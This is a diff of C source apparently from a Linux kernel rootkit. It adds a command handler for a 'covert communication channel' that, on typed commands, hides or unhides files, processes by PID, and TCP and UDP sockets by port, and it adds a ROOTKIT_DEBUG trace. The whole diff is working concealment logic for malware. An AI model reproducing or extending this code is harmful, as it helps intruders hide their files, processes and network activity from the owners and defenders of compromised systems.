@@ -1,3 +1,7 @@
+/*
+ * All functionality needed for the covert communication channel.
+ */
+#include "control.h"
 #include "include.h"
 
 static int state = 0;
@@ -13,7 +17,68 @@ static int param_counter;
 void
 execute_command (void)
 {
+	int port;
+	pid_t pid;
 
+	if(strcmp(command_buffer, "hide_file") == 0) {
+		if(param_counter > 0) {
+			hide_file_path(param_buffer);
+		}
+	} else if(strcmp(command_buffer, "unhide_file") == 0) {
+		if(param_counter > 0) {
+			unhide_file_path(param_buffer);
+		}
+		
+	} else if(strcmp(command_buffer, "hide_process") == 0) {
+		if(param_counter > 0) {
+			pid = convert_atoi(param_buffer);
+			hide_process(pid);	
+		}
+		
+	} else if(strcmp(command_buffer, "unhide_process") == 0) {
+		if(param_counter > 0) {
+			pid = convert_atoi(param_buffer);
+			unhide_process(pid);	
+		}
+		
+	} else if(strcmp(command_buffer, "hide_tcp") == 0) {
+		if(param_counter > 0) {
+			port = convert_atoi(param_buffer);
+			hide_tcp_socket(port);
+		}
+		
+	} else if(strcmp(command_buffer, "unhide_tcp") == 0) {
+		if(param_counter > 0) {
+			port = convert_atoi(param_buffer);
+			unhide_tcp_socket(port);
+		}
+		
+	} else if(strcmp(command_buffer, "hide_udp") == 0) {
+		if(param_counter > 0) {
+			port = convert_atoi(param_buffer);
+			hide_udp_socket(port);
+		}
+		
+	} else if(strcmp(command_buffer, "unhide_udp") == 0) {
+		if(param_counter > 0) {
+			port = convert_atoi(param_buffer);
+			unhide_udp_socket(port);
+		}
+		
+	} else if(strcmp(command_buffer, "hide_module") == 0) {
+		
+	} else if(strcmp(command_buffer, "unhide_module") == 0) {
+		
+	}
+
+	/* cleanup */
+	memset(command_buffer, 0, 32);
+	command_counter = 0;
+	
+	memset(param_buffer, 0 , 1024);
+	param_counter = 0;
+
+	state = 0;
 }
 
 void
@@ -21,10 +86,10 @@ accept_command_input (char input)
 {
 	if(command_counter >= 0 && command_counter < 32) {
 
-		if(input == ' ') {
+		if(input == ' ') {		/* continue with parameter */
 			command_buffer[command_counter] = '\0';
 			state = 2;
-		} else if(input == ';') {
+		} else if(input == ';') {	/* terminate command */
 			execute_command();
 		} else {
 			command_buffer[command_counter] = input;
@@ -42,10 +107,10 @@ accept_command_input (char input)
 void accept_param_input (char input)
 {
 	if(param_counter >= 0 && param_counter < 1024) {
-		if(input == ';') {
+		if(input == ';') {		/* terminate the parameter */
 			param_buffer[param_counter] = '\0';
 			execute_command();	
-		} else if(input == '\'') {
+		} else if(input == '\'') {	/* useful for aborting input */
 			memset(command_buffer, 0, 32);
 			command_counter = 0;
 
@@ -90,4 +155,5 @@ accept_input (char input)
 	} else if(state == 2) {
 		accept_param_input(input);
 	}
+	ROOTKIT_DEBUG("Accepted input '%c'. State=%u, CState=%u.\n", input, state, cstate);
 }
